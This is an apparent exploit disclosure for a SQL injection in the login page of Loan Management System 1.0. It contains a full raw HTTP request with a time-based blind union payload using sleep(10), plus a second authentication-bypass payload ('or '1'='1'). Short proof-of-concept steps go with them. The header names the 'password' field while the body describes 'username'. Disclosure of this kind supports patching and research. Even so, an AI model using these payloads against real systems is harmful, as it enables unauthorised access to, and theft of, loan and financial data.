# Loan Management System - login.php 'password' SQL inject

#### Exploit Title: Loan Management System - login.php 'username' SQL inject

#### Exploit Author: [webraybtl@webray.com.cn](mailto:webraybtl@webray.com.cn) inc

#### Vendor Homepage: https://www.sourcecodester.com/php/15529/loan-management-system-oop-php-mysqlijquery-free-source-code.html

#### Software Link:https://www.sourcecodester.com/php/15529/loan-management-system-oop-php-mysqlijquery-free-source-code.html

#### Version: Loan Management System 1.0

#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description

The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection vulnerability.Loan Management System does not filter the content correctly at the "login.php/username" parameter, resulting in the generation of SQL injection.

#### Payload used:

```POST /login.php HTTP/1.1
POST /login.php HTTP/1.1
Host: 192.168.31.35:8091
Content-Length: 68
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.31.35:8091
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.31.35:8091/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=lkdn1jvj1em9c4j3olu9e2pdpo
Connection: close

username=admin'union select 1,sleep(10),3,4,5#&password=admin&login=
```

#### Proof of Concept

1、Grab the package at the login and find that the login program is in login php

2、Looking at the source code, it is found that the password field is directly brought into the SQL statement query without filtering

 ![image](https://github.com/joinia/webray.com.cn/blob/main/php-bank/images/sourcecodesql.png)

3、Use payload "sleep (10)" for blind SQL injection.It is found that the time blind injection is successful

 ![image](https://github.com/joinia/webray.com.cn/blob/main/php-bank/images/sleep10.png)

4、We can also use the universal account and password to log in to the system

payload:`username=123'or '1'='1' --+&password=admin&login=`

 ![image](https://github.com/joinia/webray.com.cn/blob/main/php-bank/images/universalaccount.png)

SQL injection also exists in the "password" field, so I won't describe it in detail here.
